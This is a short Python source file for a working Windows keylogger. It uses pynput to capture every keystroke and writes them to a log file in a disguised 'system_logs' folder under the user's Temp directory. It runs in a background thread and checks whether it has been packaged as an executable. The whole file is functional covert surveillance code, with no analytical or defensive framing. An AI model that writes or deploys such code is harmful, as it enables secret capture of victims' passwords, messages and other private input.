import pynput.keyboard
import logging
import os
import sys
import threading
import shutil

# Define a hidden directory within the user's profile
LOG_DIR = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'system_logs')
LOG_PATH = os.path.join(LOG_DIR, 'activity.log')

def on_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        current_key = f" [{str(key)}] "
    
    with open(LOG_PATH, "a") as f:
        f.write(current_key)

def ensure_log_directory():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR, exist_ok=True)

def start_logger():
    ensure_log_directory()
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    if getattr(sys, 'frozen', False):
        # Ensure the log directory exists
        ensure_log_directory()
    
    logger_thread = threading.Thread(target=start_logger)
    logger_thread.daemon = True
    logger_thread.start()
    
    logger_thread.join()